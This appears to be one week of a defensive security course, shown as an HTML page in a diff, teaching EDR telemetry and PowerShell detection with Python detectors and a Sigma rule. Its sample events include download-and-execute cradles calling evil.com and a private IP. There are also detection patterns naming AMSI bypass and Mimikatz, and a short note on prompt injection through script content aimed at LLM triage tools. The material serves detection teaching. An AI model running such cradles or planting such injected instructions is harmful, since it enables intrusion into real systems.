@@ -1,0 +1,1216 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow">
+<title>Week 13 — Endpoint EDR Detection</title>
+<link rel="stylesheet" href="style.css">
+<script src="app.js" defer></script></head>
+<body data-site="cyber">
+<header class="top"><div class="in">
+<a class="brand" href="index.html">Cyber Track</a>
+<a href="index.html">Weeks</a><a href="play.html">Playground</a><a href="../index.html">All sites</a>
+<span class="sp"></span><span class="prog" id="prog"></span>
+</div></header>
+<main>
+<h1>Week 13 — Endpoint EDR Detection</h1><div class="toc"><a class="btn ghost" href="#day-1">Day 1</a><a class="btn ghost" href="#day-2">Day 2</a><a class="btn ghost" href="#day-3">Day 3</a><a class="btn ghost" href="#day-4">Day 4</a><a class="btn ghost" href="#day-5">Day 5</a></div><p class="note">Done this week: <span data-week-count="13" data-size="5"></span></p><p class="note">Code blocks run in your browser. <button class="ghost" id="resetpy" type="button">Reset Python session</button></p><h1>Week 13 — Endpoint EDR Detection</h1>
+<h2>Metadata</h2>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Phase</td>
+<td>Phase 4 — Detection Engineering</td>
+</tr>
+<tr>
+<td>Cert Alignment</td>
+<td>BTL1: Endpoint detection + EDR analysis / SC-200: MDE alerts + hunting / GCIA: Host-based intrusion detection</td>
+</tr>
+<tr>
+<td>Royal Road</td>
+<td>3 production Sigma rules (PowerShell, LOLBin, process hollowing)</td>
+</tr>
+<tr>
+<td>Prerequisites</td>
+<td>W02 (Windows internals), W08 (Sysmon), W09 (Sigma), W10 (CI pipeline), W12 (methodology)</td>
+</tr>
+<tr>
+<td>Est. Hours</td>
+<td>8–10 hrs</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="day-1">Day 1 — EDR Architecture and Telemetry</h2><label class="daydone"><input type="checkbox" class="daydone" data-id="13-1"> Mark this day done</label>
+<div class="watch"><h4>Watch</h4><ul><li><a href="https://www.youtube.com/watch?v=dKNjwxpHusg" target="_blank" rel="noopener"><b>What Is Endpoint Detection and Response (EDR)?</b><small>Heimdal</small></a></li></ul><p class="alt">Not what you need? Search YouTube: <a href="https://www.youtube.com/results?search_query=EDR%20endpoint%20detection%20response%20architecture%20kernel%20telemetry%20Sysmon%20MDE" target="_blank" rel="noopener">EDR endpoint detection response architecture kernel telemetry Sysmon MDE</a></p></div>
+<hr />
+<h3>Concept 1 — How EDR Sensors Collect Telemetry</h3>
+<p>EDR (Endpoint Detection and Response) tools instrument the operating system kernel to capture events that standard log sources miss. Where Windows Security event logs capture authentication and audit events, EDR sensors hook system calls and observe process creation, file writes, registry changes, network connections, and memory operations in real time.</p>
+<p>The telemetry hierarchy from richest to sparser:</p>
+<ul>
+<li><strong>Kernel driver hooks</strong> (EDR agent, Sysmon): process injection, memory allocation, driver loads — raw system-call level</li>
+<li><strong>ETW (Event Tracing for Windows)</strong>: Microsoft's event instrumentation bus — .NET, PowerShell, WMI, DNS</li>
+<li><strong>Windows Event Log</strong>: authentication, object access, audit events — coarser granularity</li>
+<li><strong>File-based logs</strong>: IIS, application logs — no real-time delivery guarantee</li>
+</ul>
+<p>Sysmon sits at the ETW + driver level. Microsoft Defender for Endpoint (MDE) and CrowdStrike operate at the kernel driver level with additional behavioral engine analysis. The richer the telemetry, the more accurate the detection — but also the higher the storage and processing cost.</p>
+<p>Data engineering analogy: EDR telemetry is the equivalent of CDC (Change Data Capture) in a data pipeline. Instead of reading daily snapshots, you capture every row-level change in real time. The trade-off is the same: near-real-time fidelity at higher cost vs. batch snapshots at lower cost.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>from dataclasses import dataclass
+from typing import Optional
+from enum import Enum
+
+class TelemetrySource(str, Enum):
+    SYSMON = &quot;Sysmon&quot;
+    MDE = &quot;MDE&quot;
+    CROWDSTRIKE = &quot;CrowdStrike&quot;
+    WINDOWS_SECURITY = &quot;WindowsSecurity&quot;
+    ETW = &quot;ETW&quot;
+
+@dataclass
+class TelemetryEvent:
+    source: TelemetrySource
+    event_type: str
+    process_name: str
+    parent_process: str
+    command_line: str
+    user: str
+    hostname: str
+    timestamp: str
+    pid: int
+    ppid: int
+    image_hash: Optional[str] = None
+    network_dest: Optional[str] = None
+
+    def is_privileged_context(self) -&gt; bool:
+        return self.user.lower() in (&quot;system&quot;, &quot;nt authority\\system&quot;, &quot;administrator&quot;)
+
+event = TelemetryEvent(
+    source=TelemetrySource.SYSMON,
+    event_type=&quot;ProcessCreate&quot;,
+    process_name=&quot;powershell.exe&quot;,
+    parent_process=&quot;winword.exe&quot;,
+    command_line=&quot;powershell.exe -nop -w hidden -enc aQBlAHgA&quot;,
+    user=&quot;CORP\\jsmith&quot;,
+    hostname=&quot;ws-042&quot;,
+    timestamp=&quot;2024-03-15T10:23:45Z&quot;,
+    pid=4812,
+    ppid=3204,
+)
+
+print(f&quot;Suspicious parent: {event.parent_process} → {event.process_name}&quot;)
+print(f&quot;Privileged: {event.is_privileged_context()}&quot;)
+print(f&quot;Encoded command: {&#x27;-enc&#x27; in event.command_line or &#x27;-EncodedCommand&#x27; in event.command_line}&quot;)
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Add a method <code>risk_indicators(self) -&gt; list[str]</code> to <code>TelemetryEvent</code> that returns a list of triggered indicator names. Check for: encoded command (<code>-enc</code> or <code>-EncodedCommand</code> in command_line), suspicious parent (parent is a document app: winword, excel, outlook, acrobat), hidden window flag (<code>-w hidden</code> or <code>-windowstyle hidden</code>), temp directory execution (command_line contains <code>\AppData\Local\Temp</code> or <code>\Temp\</code>), and no-profile flag (<code>-nop</code> or <code>-noprofile</code>). Call it on the example event and print the triggered indicators.
+Expected output: list with at least 3 triggered indicators for the example event (encoded + suspicious parent + hidden window + no-profile)</p>
+<hr />
+<h3>Concept 2 — Sysmon Event ID Reference for Detection</h3>
+<p>Sysmon generates numbered event IDs where each ID type corresponds to a specific OS operation. Detection rules target specific event IDs. Knowing which event IDs produce which telemetry is prerequisite knowledge for writing Sysmon-based Sigma rules.</p>
+<p>Core Sysmon event IDs for detection:</p>
+<table>
+<thead>
+<tr>
+<th>Event ID</th>
+<th>Name</th>
+<th>Detection Use</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>ProcessCreate</td>
+<td>Execution detection, LOLBin, malicious spawning</td>
+</tr>
+<tr>
+<td>3</td>
+<td>NetworkConnect</td>
+<td>C2 beaconing, DNS exfiltration</td>
+</tr>
+<tr>
+<td>7</td>
+<td>ImageLoad</td>
+<td>DLL injection, side-loading</td>
+</tr>
+<tr>
+<td>8</td>
+<td>CreateRemoteThread</td>
+<td>Process injection</td>
+</tr>
+<tr>
+<td>10</td>
+<td>ProcessAccess</td>
+<td>LSASS credential dumping</td>
+</tr>
+<tr>
+<td>11</td>
+<td>FileCreate</td>
+<td>Dropper staging, lateral movement artifacts</td>
+</tr>
+<tr>
+<td>12/13</td>
+<td>RegistryEvent</td>
+<td>Persistence, Run keys, COM hijacking</td>
+</tr>
+<tr>
+<td>22</td>
+<td>DNSQuery</td>
+<td>C2 domain lookup, DNS tunneling</td>
+</tr>
+<tr>
+<td>23</td>
+<td>FileDelete</td>
+<td>Evidence clearing</td>
+</tr>
+<tr>
+<td>25</td>
+<td>ProcessTampering</td>
+<td>Process hollowing (Sysmon 13+)</td>
+</tr>
+</tbody>
+</table>
+<p>Event IDs 1, 3, and 10 cover the majority of high-value detections. Event ID 25 is newer and specifically designed to detect process hollowing.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>from dataclasses import dataclass
+from typing import Dict, List
+
+SYSMON_EVENT_REGISTRY: Dict[int, dict] = {
+    1:  {&quot;name&quot;: &quot;ProcessCreate&quot;,      &quot;technique_coverage&quot;: [&quot;T1059&quot;, &quot;T1204&quot;, &quot;T1053&quot;]},
+    3:  {&quot;name&quot;: &quot;NetworkConnect&quot;,     &quot;technique_coverage&quot;: [&quot;T1071&quot;, &quot;T1095&quot;, &quot;T1048&quot;]},
+    7:  {&quot;name&quot;: &quot;ImageLoad&quot;,          &quot;technique_coverage&quot;: [&quot;T1055.001&quot;, &quot;T1574.002&quot;]},
+    8:  {&quot;name&quot;: &quot;CreateRemoteThread&quot;, &quot;technique_coverage&quot;: [&quot;T1055&quot;]},
+    10: {&quot;name&quot;: &quot;ProcessAccess&quot;,      &quot;technique_coverage&quot;: [&quot;T1003.001&quot;]},
+    11: {&quot;name&quot;: &quot;FileCreate&quot;,         &quot;technique_coverage&quot;: [&quot;T1105&quot;, &quot;T1074&quot;]},
+    22: {&quot;name&quot;: &quot;DNSQuery&quot;,           &quot;technique_coverage&quot;: [&quot;T1071.004&quot;, &quot;T1568&quot;]},
+    25: {&quot;name&quot;: &quot;ProcessTampering&quot;,   &quot;technique_coverage&quot;: [&quot;T1055.012&quot;]},
+}
+
+def events_for_technique(technique_id: str) -&gt; List[int]:
+    return [
+        eid for eid, data in SYSMON_EVENT_REGISTRY.items()
+        if any(t.startswith(technique_id) for t in data[&quot;technique_coverage&quot;])
+    ]
+
+def coverage_for_event(event_id: int) -&gt; List[str]:
+    return SYSMON_EVENT_REGISTRY.get(event_id, {}).get(&quot;technique_coverage&quot;, [])
+
+print(f&quot;Events for T1055 (Process Injection): {events_for_technique(&#x27;T1055&#x27;)}&quot;)
+print(f&quot;Techniques covered by Event 1: {coverage_for_event(1)}&quot;)
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Add three more event IDs to the registry: Event 12 (RegistryEvent — techniques T1547.001, T1112), Event 13 (RegistryValueSet — T1547.001), Event 15 (FileCreateStreamHash — T1564.004). Then write a function <code>detection_plan(techniques: list) -&gt; dict</code> that returns for each technique a list of Sysmon event IDs to monitor. Call it with <code>[&quot;T1547.001&quot;, &quot;T1055&quot;, &quot;T1003.001&quot;]</code> and print the result.
+Expected output: dict mapping each technique to a list of relevant Sysmon event IDs; T1547.001 should map to events 12 and 13</p>
+<hr />
+<h3>Concept 3 — MDE Advanced Hunting Schema</h3>
+<p>Microsoft Defender for Endpoint (MDE) provides an Advanced Hunting interface using KQL over normalized telemetry tables. The main tables overlap with Sysmon event types but follow a different schema.</p>
+<p>Core MDE Advanced Hunting tables:</p>
+<table>
+<thead>
+<tr>
+<th>Table</th>
+<th>Sysmon equivalent</th>
+<th>Key columns</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>DeviceProcessEvents</code></td>
+<td>Event ID 1</td>
+<td>ProcessCommandLine, InitiatingProcessFileName, AccountName</td>
+</tr>
+<tr>
+<td><code>DeviceNetworkEvents</code></td>
+<td>Event ID 3</td>
+<td>RemoteIP, RemoteUrl, InitiatingProcessFileName</td>
+</tr>
+<tr>
+<td><code>DeviceFileEvents</code></td>
+<td>Event ID 11</td>
+<td>FolderPath, FileName, InitiatingProcessFileName</td>
+</tr>
+<tr>
+<td><code>DeviceRegistryEvents</code></td>
+<td>Event ID 12/13</td>
+<td>RegistryKey, RegistryValueData, ActionType</td>
+</tr>
+<tr>
+<td><code>DeviceImageLoadEvents</code></td>
+<td>Event ID 7</td>
+<td>FileName, FolderPath, InitiatingProcessFileName</td>
+</tr>
+<tr>
+<td><code>DeviceAlertEvents</code></td>
+<td>—</td>
+<td>AlertId, Title, Severity, Category</td>
+</tr>
+</tbody>
+</table>
+<p>Sigma rules written for Sysmon (logsource category: process_creation) can be translated to MDE KQL by mapping field names: <code>Image</code> → <code>FolderPath + FileName</code>, <code>CommandLine</code> → <code>ProcessCommandLine</code>, <code>ParentImage</code> → <code>InitiatingProcessFileName</code>.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>SYSMON_TO_MDE_FIELD_MAP = {
+    &quot;Image&quot;:              &quot;FolderPath + &#x27;\\\\&#x27; + FileName&quot;,
+    &quot;CommandLine&quot;:        &quot;ProcessCommandLine&quot;,
+    &quot;ParentImage&quot;:        &quot;InitiatingProcessFolderPath + &#x27;\\\\&#x27; + InitiatingProcessFileName&quot;,
+    &quot;ParentCommandLine&quot;:  &quot;InitiatingProcessCommandLine&quot;,
+    &quot;User&quot;:               &quot;AccountName&quot;,
+    &quot;Hashes&quot;:             &quot;MD5&quot;,
+    &quot;SourceImage&quot;:        &quot;InitiatingProcessFolderPath + &#x27;\\\\&#x27; + InitiatingProcessFileName&quot;,
+    &quot;TargetImage&quot;:        &quot;FolderPath + &#x27;\\\\&#x27; + FileName&quot;,
+}
+
+SYSMON_TABLE_MAP = {
+    &quot;process_creation&quot;:      &quot;DeviceProcessEvents&quot;,
+    &quot;network_connection&quot;:    &quot;DeviceNetworkEvents&quot;,
+    &quot;file_event&quot;:            &quot;DeviceFileEvents&quot;,
+    &quot;registry_event&quot;:        &quot;DeviceRegistryEvents&quot;,
+    &quot;image_load&quot;:            &quot;DeviceImageLoadEvents&quot;,
+}
+
+def translate_sigma_logsource(sysmon_category: str) -&gt; str:
+    return SYSMON_TABLE_MAP.get(sysmon_category, &quot;DeviceEvents&quot;)
+
+def translate_sigma_field(field_name: str) -&gt; str:
+    return SYSMON_TO_MDE_FIELD_MAP.get(field_name, field_name)
+
+sigma_detection = {
+    &quot;selection&quot;: {
+        &quot;Image|endswith&quot;: &quot;\\powershell.exe&quot;,
+        &quot;CommandLine|contains&quot;: &quot;-enc&quot;,
+        &quot;ParentImage|endswith&quot;: &quot;\\winword.exe&quot;,
+    }
+}
+
+print(f&quot;Table: {translate_sigma_logsource(&#x27;process_creation&#x27;)}&quot;)
+for field, value in sigma_detection[&quot;selection&quot;].items():
+    raw_field = field.split(&quot;|&quot;)[0]
+    mde_field = translate_sigma_field(raw_field)
+    print(f&quot;  {field} → {mde_field}: {value!r}&quot;)
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Write a function <code>sigma_detection_to_kql(detection: dict, category: str) -&gt; str</code> that takes a Sigma detection block (selection dict) and a logsource category, and produces a KQL <code>where</code> clause string. Handle the modifiers <code>|endswith</code>, <code>|contains</code>, and <code>|startswith</code> by generating <code>endswith(field, value)</code>, <code>contains(field, value)</code>, <code>startswith(field, value)</code> respectively. Test with the <code>sigma_detection</code> dict above and print the resulting KQL <code>where</code> clause.
+Expected output: a valid KQL where clause combining the three conditions with <code>and</code></p>
+<hr />
+<h3>LLM Integration</h3>
+<p><strong>Topic:</strong> LLMs can translate Sigma rules to MDE Advanced Hunting KQL with higher accuracy than rule-engine translators because they understand semantic context, not just field name mappings.
+<strong>Threat:</strong> An LLM translating Sigma rules may silently drop conditions or mishandle complex modifiers (<code>|all</code>, <code>|windash</code>, <code>|re</code>), producing rules that appear valid but have gaps.
+<strong>Opportunity:</strong> Use LLMs as a first-pass translator, then diff the original Sigma logic against the KQL output to catch translation errors before deployment.
+<strong>Prompt to try:</strong> <code>&quot;Translate this Sigma rule detection block to Microsoft Defender for Endpoint Advanced Hunting KQL. Use the DeviceProcessEvents table. Map: Image → FolderPath/FileName, CommandLine → ProcessCommandLine, ParentImage → InitiatingProcessFileName. Detection: ParentImage ends with 'winword.exe' AND CommandLine contains '-enc' AND Image ends with 'powershell.exe'. Return only the KQL query, starting from the table name, with a where clause. Add a comment explaining each condition.&quot;</code></p>
+<hr />
+<h2 id="day-2">Day 2 — PowerShell Detection</h2><label class="daydone"><input type="checkbox" class="daydone" data-id="13-2"> Mark this day done</label>
+<div class="watch"><h4>Watch</h4><ul><li><a href="https://www.youtube.com/watch?v=dN1hNgsk8cc" target="_blank" rel="noopener"><b>Detect Malicious PowerShell Code | Hands-On Lab</b><small>bluecapesec</small></a></li></ul><p class="alt">Not what you need? Search YouTube: <a href="https://www.youtube.com/results?search_query=PowerShell%20detection%20Sigma%20rule%20encoded%20command%20AMSI%20logging%20bypass%20hunting" target="_blank" rel="noopener">PowerShell detection Sigma rule encoded command AMSI logging bypass hunting</a></p></div>
+<hr />
+<h3>Concept 1 — PowerShell Attack Vectors</h3>
+<p>PowerShell is the most commonly abused built-in Windows tool for post-exploitation. Attackers use it because it is installed on every Windows machine, has deep access to the .NET framework and Windows API, and can download and execute code in memory without writing files to disk.</p>
+<p>Core PowerShell attack patterns:</p>
+<ul>
+<li><strong>Encoded commands</strong>: <code>-enc</code> / <code>-EncodedCommand</code> encodes the payload in Base64, hiding it from basic command-line string matching</li>
+<li><strong>Download cradles</strong>: <code>IEX (New-Object Net.WebClient).DownloadString(URL)</code> — downloads and executes a script entirely in memory</li>
+<li><strong>Constrained Language Mode bypass</strong>: attackers use <code>-version 2</code> to downgrade PowerShell to a version that predates many security controls (AMSI, ScriptBlock logging)</li>
+<li><strong>AMSI bypass</strong>: injecting into the AmsiScanBuffer function to disable Antimalware Scan Interface before running malicious code</li>
+<li><strong>Obfuscation</strong>: string concatenation (<code>&quot;power&quot; + &quot;shell&quot;</code>), backtick insertion (<code>po</code>wer<code>shell</code>), character substitution</li>
+</ul>
+<p>Detection strategy: layer multiple indicators — command-line flags (<code>-enc</code>, <code>-nop</code>, <code>-w hidden</code>), parent process anomalies, ScriptBlock logging (Event ID 4104), PowerShell version downgrade.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>import base64
+from dataclasses import dataclass
+from typing import List
+
+@dataclass
+class PowerShellEvent:
+    command_line: str
+    parent_process: str
+    user: str
+    ps_version: str = &quot;5.1&quot;
+    script_block: str = &quot;&quot;
+
+def decode_b64_command(encoded: str) -&gt; str:
+    try:
+        decoded = base64.b64decode(encoded).decode(&quot;utf-16-le&quot;)
+        return decoded
+    except Exception:
+        return &quot;[decode failed]&quot;
+
+def analyze_powershell_event(event: PowerShellEvent) -&gt; List[str]:
+    indicators = []
+    cmd = event.command_line.lower()
+
+    if &quot;-enc&quot; in cmd or &quot;-encodedcommand&quot; in cmd:
+        indicators.append(&quot;ENCODED_COMMAND&quot;)
+        parts = event.command_line.split()
+        for i, part in enumerate(parts):
+            if part.lower() in (&quot;-enc&quot;, &quot;-encodedcommand&quot;) and i + 1 &lt; len(parts):
+                decoded = decode_b64_command(parts[i + 1])
+                indicators.append(f&quot;DECODED: {decoded[:80]}&quot;)
+
+    if &quot;-nop&quot; in cmd or &quot;-noprofile&quot; in cmd:
+        indicators.append(&quot;NO_PROFILE&quot;)
+    if &quot;-w hidden&quot; in cmd or &quot;-windowstyle hidden&quot; in cmd:
+        indicators.append(&quot;HIDDEN_WINDOW&quot;)
+    if &quot;-version 2&quot; in cmd or &quot;-ver 2&quot; in cmd:
+        indicators.append(&quot;VERSION_DOWNGRADE&quot;)
+    if &quot;downloadstring&quot; in cmd or &quot;webclient&quot; in cmd or &quot;iex &quot; in cmd:
+        indicators.append(&quot;DOWNLOAD_CRADLE&quot;)
+    if event.parent_process.lower() in (&quot;winword.exe&quot;, &quot;excel.exe&quot;, &quot;outlook.exe&quot;, &quot;acrord32.exe&quot;):
+        indicators.append(f&quot;SUSPICIOUS_PARENT:{event.parent_process}&quot;)
+
+    return indicators
+
+encoded_payload = base64.b64encode(&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://evil.com/payload.ps1&#x27;)&quot;.encode(&quot;utf-16-le&quot;)).decode()
+
+event = PowerShellEvent(
+    command_line=f&quot;powershell.exe -nop -w hidden -enc {encoded_payload}&quot;,
+    parent_process=&quot;winword.exe&quot;,
+    user=&quot;CORP\\jsmith&quot;,
+)
+
+indicators = analyze_powershell_event(event)
+for ind in indicators:
+    print(ind)
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Add detection for two more indicators: (1) <code>AMSI_BYPASS</code> — command_line or script_block contains <code>AmsiScanBuffer</code>, <code>amsi.dll</code>, or <code>[Runtime.InteropServices.Marshal]</code>; (2) <code>INVOKE_EXPRESSION</code> — command_line or script_block contains <code>iex</code>, <code>invoke-expression</code>, or <code>&amp;([scriptblock]</code>. Add both checks to <code>analyze_powershell_event</code>. Create a second test event that triggers both new indicators and at least two existing ones. Print all indicators for both events.
+Expected output: first event triggers ENCODED_COMMAND + NO_PROFILE + HIDDEN_WINDOW + SUSPICIOUS_PARENT; second event triggers AMSI_BYPASS + INVOKE_EXPRESSION + 2 more</p>
+<hr />
+<h3>Concept 2 — Writing a Production PowerShell Sigma Rule</h3>
+<p>A production Sigma rule for PowerShell execution is more complex than a tutorial rule because it must balance detection coverage against false positive rate. The rule must be tunable: a base rule catches the broadest set of malicious patterns, with an explicit allowlist for known-legitimate processes that match.</p>
+<p>Production Sigma rule structure for PowerShell detection:</p>
+<ul>
+<li><strong>Detection logic</strong>: use <code>OR</code> conditions within a selection block (pipe-separated lists)</li>
+<li><strong>Allowlist (filter)</strong>: use a <code>filter</code> block with <code>condition: selection and not filter</code></li>
+<li><strong>Multiple selections</strong>: <code>selection_encoded</code> + <code>selection_parent</code> + <code>selection_downgrade</code> combined with <code>1 of selection_*</code></li>
+</ul>
+<p>The condition <code>1 of selection_*</code> fires if any selection block matches, which implements OR logic across blocks without a deeply nested condition string.</p>
+<p><strong>Example:</strong></p>
+<pre><code>title: Suspicious PowerShell Execution
+id: a6e1fc00-9e2e-4b1a-9ac0-1234567890ab
+status: production
+description: Detects suspicious PowerShell execution patterns including encoded commands,
+  download cradles, version downgrade, and suspicious parent processes.
+references:
+  - https://attack.mitre.org/techniques/T1059/001/
+author: Detection Team
+date: 2024/03/15
+modified: 2024/03/15
+tags:
+  - attack.execution
+  - attack.t1059_001
+  - attack.defense_evasion
+  - attack.t1027
+logsource:
+  category: process_creation
+  product: windows
+detection:
+  selection_encoded:
+    Image|endswith: &#x27;\powershell.exe&#x27;
+    CommandLine|contains:
+      - &#x27; -enc &#x27;
+      - &#x27; -EncodedCommand &#x27;
+  selection_cradle:
+    Image|endswith: &#x27;\powershell.exe&#x27;
+    CommandLine|contains:
+      - &#x27;DownloadString&#x27;
+      - &#x27;DownloadFile&#x27;
+      - &#x27;WebClient&#x27;
+      - &#x27;IEX &#x27;
+      - &#x27;Invoke-Expression&#x27;
+  selection_downgrade:
+    Image|endswith: &#x27;\powershell.exe&#x27;
+    CommandLine|contains:
+      - &#x27;-version 2&#x27;
+      - &#x27;-ver 2&#x27;
+  selection_suspicious_parent:
+    Image|endswith: &#x27;\powershell.exe&#x27;
+    ParentImage|endswith:
+      - &#x27;\winword.exe&#x27;
+      - &#x27;\excel.exe&#x27;
+      - &#x27;\outlook.exe&#x27;
+      - &#x27;\acrord32.exe&#x27;
+      - &#x27;\mshta.exe&#x27;
+      - &#x27;\wscript.exe&#x27;
+      - &#x27;\cscript.exe&#x27;
+  filter_legitimate:
+    ParentImage|endswith:
+      - &#x27;\sccm.exe&#x27;
+      - &#x27;\ccmexec.exe&#x27;
+      - &#x27;\deploy.exe&#x27;
+  condition: (1 of selection_*) and not filter_legitimate
+falsepositives:
+  - Software deployment tools (SCCM, Intune) using encoded commands
+  - IT admin scripts run from office applications (rare but possible)
+  - Security tools that invoke PowerShell programmatically
+level: high
+</code></pre><p><strong>Exercise:</strong>
+The rule above has a <code>filter_legitimate</code> block that only covers SCCM-related processes. Extend the filter: add a second filter block <code>filter_known_tools</code> for processes that commonly generate false positives in enterprise environments — do your own research or reason from first principles for at least 3 additional legitimate parent processes that run PowerShell. Then write a Python function <code>validate_sigma_rule(rule_yaml: str) -&gt; list[str]</code> that checks: (1) <code>id</code> field is a valid UUID format, (2) <code>tags</code> contains at least one <code>attack.t</code> tag, (3) <code>level</code> is one of low/medium/high/critical, (4) <code>falsepositives</code> list is non-empty. Return a list of validation errors (empty list = valid). Test against the rule YAML above.
+Expected output: validation passes (empty list); if you remove a required field and re-test, the relevant error message appears</p>
+<hr />
+<h3>Concept 3 — ScriptBlock Logging and Event 4104</h3>
+<p>Windows Event ID 4104 is generated by the PowerShell ScriptBlock logging feature, which records the full content of every PowerShell script block as it executes — even after obfuscation is decoded, because the logging happens after the PowerShell engine deobfuscates the payload.</p>
+<p>Event 4104 requires Group Policy configuration: <code>Computer Configuration → Administrative Templates → Windows Components → Windows PowerShell → Turn on PowerShell Script Block Logging</code>. Once enabled, the full script content is visible even if the command-line used <code>-enc</code> encoding.</p>
+<p>Detecting on ScriptBlock content catches techniques that evade command-line analysis:</p>
+<ul>
+<li>Obfuscated <code>Invoke-Expression</code> calls that expand at runtime</li>
+<li>Multi-stage loaders that appear benign on the command line but contain malicious content in the script block</li>
+<li>AMSI bypass code that uses string concatenation to hide function names</li>
+</ul>
+<p>Detection strategy: write two rules — one for command-line indicators (Event ID 1 via Sysmon) and one for ScriptBlock content (Event ID 4104). Together they cover the full attack surface.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>from dataclasses import dataclass
+from typing import List
+import re
+
+@dataclass
+class ScriptBlockEvent:
+    event_id: int  # 4104
+    script_block_id: str
+    script_block_text: str
+    path: str
+    hostname: str
+    user: str
+
+SCRIPTBLOCK_MALICIOUS_PATTERNS = [
+    (r&quot;AmsiScanBuffer&quot;,           &quot;AMSI_BYPASS&quot;),
+    (r&quot;VirtualAlloc&quot;,             &quot;SHELLCODE_ALLOC&quot;),
+    (r&quot;GetProcAddress&quot;,           &quot;API_RESOLVE&quot;),
+    (r&quot;Invoke-Mimikatz&quot;,          &quot;MIMIKATZ_INVOCATION&quot;),
+    (r&quot;sekurlsa::&quot;,               &quot;MIMIKATZ_MODULE&quot;),
+    (r&quot;\$env:APPDATA.*\.exe&quot;,     &quot;APPDATA_EXEC&quot;),
+    (r&quot;New-Object.*WebClient&quot;,    &quot;WEBCLIENT&quot;),
+    (r&quot;IEX\s*\(&quot;,                 &quot;INVOKE_EXPRESSION&quot;),
+    (r&quot;\[Convert\]::FromBase64&quot;,  &quot;BASE64_DECODE&quot;),
+    (r&quot;Net\.Sockets\.TcpClient&quot;,  &quot;RAW_SOCKET&quot;),
+]
+
+def analyze_scriptblock(event: ScriptBlockEvent) -&gt; List[dict]:
+    findings = []
+    for pattern, indicator in SCRIPTBLOCK_MALICIOUS_PATTERNS:
+        matches = re.findall(pattern, event.script_block_text, re.IGNORECASE)
+        if matches:
+            findings.append({
+                &quot;indicator&quot;: indicator,
+                &quot;pattern&quot;: pattern,
+                &quot;match_count&quot;: len(matches),
+            })
+    return findings
+
+sample_script = &quot;&quot;&quot;
+$encoded = [Convert]::FromBase64String(&#x27;aQBlAHgA&#x27;)
+$text = [Text.Encoding]::Unicode.GetString($encoded)
+IEX ($text)
+$wc = New-Object Net.WebClient
+$payload = $wc.DownloadString(&#x27;http://192.168.1.100/stage2.ps1&#x27;)
+IEX $payload
+&quot;&quot;&quot;
+
+event = ScriptBlockEvent(
+    event_id=4104,
+    script_block_id=&quot;a1b2c3d4&quot;,
+    script_block_text=sample_script,
+    path=&quot;&quot;,
+    hostname=&quot;ws-042&quot;,
+    user=&quot;CORP\\jsmith&quot;,
+)
+
+findings = analyze_scriptblock(event)
+for f in findings:
+    print(f&quot;{f[&#x27;indicator&#x27;]}: {f[&#x27;match_count&#x27;]} match(es)&quot;)
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Add five more patterns to <code>SCRIPTBLOCK_MALICIOUS_PATTERNS</code>: (1) reflective DLL injection via <code>[Reflection.Assembly]::Load</code>, (2) registry persistence write via <code>Set-ItemProperty.*Run</code>, (3) scheduled task creation via <code>Register-ScheduledTask</code>, (4) shadow copy deletion via <code>vssadmin.*delete</code>, (5) credential access via <code>Get-Credential</code> called programmatically (i.e., in a non-interactive script). Create a second sample script block that triggers at least 3 of the new patterns plus 2 existing ones. Print all findings for both scripts.
+Expected output: both scripts' findings listed; new patterns correctly identified in the second script</p>
+<hr />
+<h3>LLM Integration</h3>
+<p><strong>Topic:</strong> LLMs trained on open-source malware repositories can recognize obfuscated PowerShell patterns that regex-based detection misses — including novel obfuscation variants.
+<strong>Threat:</strong> Prompt injection via PowerShell script content: an attacker embeds natural-language instructions in a malicious PowerShell script, which are then forwarded to an LLM-based triage system that acts on them.
+<strong>Opportunity:</strong> Use an LLM as a second-stage analyzer for flagged ScriptBlock events — ask it to explain the script's intent in plain English before the analyst reviews it.
+<strong>Prompt to try:</strong> <code>&quot;Analyze this PowerShell script block for malicious intent. Identify: (1) what the script attempts to do in plain English, (2) which MITRE ATT&amp;CK techniques it implements, (3) what indicators would appear in Windows event logs if this ran, (4) severity level (Low/Medium/High/Critical). Script: '$encoded=[Convert]::FromBase64String(\&quot;aQBlAHgA\&quot;);$text=[Text.Encoding]::Unicode.GetString($encoded);IEX($text);$wc=New-Object Net.WebClient;$wc.DownloadString(\&quot;http://192.168.1.100/s2.ps1\&quot;)|IEX'&quot;</code></p>
+<hr />
+<h2 id="day-3">Day 3 — LOLBin Detection</h2><label class="daydone"><input type="checkbox" class="daydone" data-id="13-3"> Mark this day done</label>
